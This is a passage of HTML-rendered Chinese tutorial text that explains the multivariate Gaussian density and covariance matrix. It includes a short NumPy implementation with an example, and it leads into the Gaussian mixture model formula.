class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span>，表示各维度上的均值；</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Σ</mi></mrow><annotation encoding="application/x-tex">\Sigma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord">Σ</span></span></span></span></span> 是 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>×</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">n \times n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">n</span></span></span></span></span> 的协方差矩阵（实对称且正定），它决定了分布的形态与方向；</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="normal">Σ</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">\Sigma^{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"/><span class="mord"><span class="mord">Σ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span></span> 是协方差矩阵的逆；</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi mathvariant="normal">Σ</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|\Sigma|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">∣Σ∣</span></span></span></span></span> 表示协方差矩阵的行列式，用于对整个分布进行归一化。</li>
</ul>
<p>下面我们用 Python 来实现这个多元高斯分布的概率密度函数：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
<span class="hljs-keyword">def</span> <span class="hljs-title function_">multivariate_gaussian</span>(<span class="hljs-params">x, mu, Sigma</span>):
    <span class="hljs-string">"""
    计算多元高斯分布的概率密度函数

    参数:
    x: 输入向量, 形状 (n,)
    mu: 均值向量, 形状 (n,)
    Sigma: 协方差矩阵, 形状 (n, n)

    返回:
    概率密度值：标量
    """</span>
    <span class="hljs-comment"># 1. 计算维度</span>
    n = <span class="hljs-built_in">len</span>(mu)
    <span class="hljs-comment"># 2. 计算协方差矩阵的行列式</span>
    det_Sigma = np.linalg.det(Sigma)
    <span class="hljs-comment"># 3. 计算协方差矩阵的逆</span>
    inv_Sigma = np.linalg.inv(Sigma)
    <span class="hljs-comment"># 4. 计算 x 与 mu 的差值</span>
    diff = x - mu
    <span class="hljs-comment"># 5. 计算指数部分: (x-μ)^T Σ^(-1) (x-μ)</span>
    exponent = -<span class="hljs-number">0.5</span> * diff.T @ inv_Sigma @ diff
    <span class="hljs-comment"># 6. 计算归一化系数</span>
    normalization = <span class="hljs-number">1.0</span> / ((<span class="hljs-number">2</span> * np.pi) ** (n / <span class="hljs-number">2</span>) * np.sqrt(det_Sigma))
    <span class="hljs-comment"># 7. 计算最终概率密度</span>
    pdf_value = normalization * np.exp(exponent)
    <span class="hljs-keyword">return</span> pdf_value
</code></pre>
<p>下面来使用一下这个<code>multivariate_gaussian</code>函数：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 均值向量</span>
mu = np.array([<span class="hljs-number">0.0</span>, <span class="hljs-number">0.0</span>])
<span class="hljs-comment"># 协方差矩阵（正定对称）</span>
Sigma = np.array([[<span class="hljs-number">1.0</span>, <span class="hljs-number">0.5</span>], 
                  [<span class="hljs-number">0.5</span>, <span class="hljs-number">1.0</span>]])
<span class="hljs-comment"># 测试点</span>
x_test = np.array([<span class="hljs-number">0.5</span>, <span class="hljs-number">0.5</span>])
<span class="hljs-comment"># 计算测试点的概率密度</span>
pdf_value = multivariate_gaussian(x_test, mu, Sigma)
<span class="hljs-comment"># 输出结果</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"概率密度 N(x|μ,Σ): <span class="hljs-subst">{pdf_value}</span>"</span>)

<span class="hljs-comment">## ====输出====</span>
概率密度 N(x|μ,Σ): <span class="hljs-number">0.1555632781262252</span>
</code></pre>
<p>从直观上理解，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold-italic">μ</mi></mrow><annotation encoding="application/x-tex">\boldsymbol{\mu}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6389em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord"><span class="mord boldsymbol">μ</span></span></span></span></span></span></span> 表示数据分布的中心位置，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold">x</mi></mrow><annotation encoding="application/x-tex">\mathbf{x}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4444em;"/><span class="mord mathbf">x</span></span></span></span></span> 是空间中的一个点，概率密度函数 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi mathvariant="bold">x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(\mathbf{x})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathbf">x</span><span class="mclose">)</span></span></span></span></span> 则反映了该点出现的相对可能性/概率。</p>
<p>然而，为什么一维高斯中的标准差 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>σ</mi></mrow><annotation encoding="application/x-tex">\sigma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span></span></span></span></span> 在多维情况下会扩展为一个协方差矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Σ</mi></mrow><annotation encoding="application/x-tex">\Sigma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord">Σ</span></span></span></span></span>？这是很多初学者感到困惑的地方。</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi mathvariant="normal">Σ</mi><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>σ</mi><mn>11</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>σ</mi><mn>12</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>σ</mi><mrow><mn>1</mn><mi>n</mi></mrow></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>σ</mi><mn>21</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>σ</mi><mn>22</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>σ</mi><mrow><mn>2</mn><mi>n</mi></mrow></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"/></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"/></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋱</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"/></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>σ</mi><mrow><mi>n</mi><mn>1</mn></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>σ</mi><mrow><mi>n</mi><mn>2</mn></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">…</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>σ</mi><mrow><mi>n</mi><mi>n</mi></mrow></msub></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mtext> </mtext><mo separator="true">,</mo><mtext> </mtext><msub><mi>σ</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub><mo>=</mo><msub><mi>σ</mi><mrow><mi>j</mi><mi>i</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\Sigma = \begin{bmatrix}
 \sigma_{11} &amp;\sigma_{12}  &amp; \dots  &amp;\sigma_{1n} \\
 \sigma_{21} &amp; \sigma_{22} &amp; \dots &amp; \sigma_{2n}\\
 \vdots  &amp;  \vdots &amp; \ddots  &amp; \vdots \\
  \sigma_{n1} &amp;  \sigma_{n2} &amp;  \dots &amp;  \sigma_{nn}
\end{bmatrix} \space, \space \sigma_{ij} = \sigma_{ji}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord">Σ</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:5.46em;vertical-align:-2.48em;"/><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.95em;"><span style="top:-4.95em;"><span class="pstrut" style="height:7.4em;"/><span style="width:0.667em;height:5.400em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="5.400em" viewbox="0 0 667 5400"><path d="M403 1759 V84 H666 V0 H319 V1759 v1800 v1759 h347 v-84&#10;H403z M403 1759 V0 H319 V1759 v1800 v1759 h84z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.45em;"><span/></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.98em;"><span style="top:-5.8275em;"><span class="pstrut" style="height:3.6875em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">11</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-4.6275em;"><span class="pstrut" style="height:3.6875em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">21</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-2.7675em;"><span class="pstrut" style="height:3.6875em;"/><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"/></span></span></span><span style="top:-1.5675em;"><span class="pstrut" style="height:3.6875em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.48em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.98em;"><span style="top:-5.8275em;"><span class="pstrut" style="height:3.6875em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">12</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-4.6275em;"><span class="pstrut" style="height:3.6875em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">22</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-2.7675em;"><span class="pstrut" style="height:3.6875em;"/><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"/></span></span></span><span style="top:-1.5675em;"><span class="pstrut" style="height:3.6875em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.48em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.98em;"><span style="top:-5.64em;"><span class="pstrut" style="height:3.5em;"/><span class="mord"><span class="minner">…</span></span></span><span style="top:-4.44em;"><span class="pstrut" style="height:3.5em;"/><span class="mord"><span class="minner">…</span></span></span><span style="top:-2.58em;"><span class="pstrut" style="height:3.5em;"/><span class="mord"><span class="minner">⋱</span></span></span><span style="top:-1.38em;"><span class="pstrut" style="height:3.5em;"/><span class="mord"><span class="minner">…</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.48em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.98em;"><span style="top:-5.8275em;"><span class="pstrut" style="height:3.6875em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-4.6275em;"><span class="pstrut" style="height:3.6875em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-2.7675em;"><span class="pstrut" style="height:3.6875em;"/><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"/></span></span></span><span style="top:-1.5675em;"><span class="pstrut" style="height:3.6875em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">nn</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.48em;"><span/></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.95em;"><span style="top:-4.95em;"><span class="pstrut" style="height:7.4em;"/><span style="width:0.667em;height:5.400em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="5.400em" viewbox="0 0 667 5400"><path d="M347 1759 V0 H0 V84 H263 V1759 v1800 v1759 H0 v84 H347z&#10;M347 1759 V0 H263 V1759 v1800 v1759 h84z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.45em;"><span/></span></span></span></span></span></span><span class="mspace"> </span><span class="mspace" style="margin-right:0.1667em;"/><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">ij</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ji</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span></div>
<p>其实，多维数据不仅在各维度上具有各自的离散程度，不同维度之间还可能存在关联性，从而形成具有特定方向和形状的概率椭球（或超椭球）。协方差矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Σ</mi></mrow><annotation encoding="application/x-tex">\Sigma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord">Σ</span></span></span></span></span> 正是为了完整刻画这种多维结构：</p>
<ul>
<li>其对角线元素 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>σ</mi><mrow><mi>i</mi><mi>i</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\sigma_{ii}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ii</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 表示第 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span> 个维度的方差；</li>
<li>非对角线元素 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>σ</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\sigma_{ij}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">ij</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span> 表示第 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span> 维与第 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span></span> 维之间的协方差，描述了两个维度之间的线性相关程度和共同变化趋势。</li>
</ul>
<p>理解了概率密度函数可以延伸到多维之后，我们可以更准确地重申高斯混合模型的核心思想：<strong>混合高斯模型（GMM）是一种强大的概率建模工具，它旨在将任意复杂的<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">n</span></span></span></span></span>维概率分布<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi mathvariant="bold">x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(\mathbf{x})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathbf">x</span><span class="mclose">)</span></span></span></span></span>，分解为<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span>个<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">n</span></span></span></span></span>维高斯分布的加权线性组合。</strong></p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi mathvariant="bold">x</mi><mo stretchy="false">)</mo><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>k</mi></munderover><msub><mi>π</mi><mi>i</mi></msub><mtext> </mtext><mi mathvariant="script">N</mi><mo stretchy="false">(</mo><mi mathvariant="bold">x</mi><mi mathvariant="normal">∣</mi><msub><mi mathvariant="bold-italic">μ</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi mathvariant="normal">Σ</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(\mathbf{x}) = \sum_{i=1}^{k} \pi_{i}\space \mathcal{N}(\mathbf{x}|\boldsymbol{\mu}_{i},\Sigma_{i})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathbf">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3.1138em;vertical-align:-1.2777em;"/><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8361em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"/><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span/></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace"> </span><span class="mord mathcal" 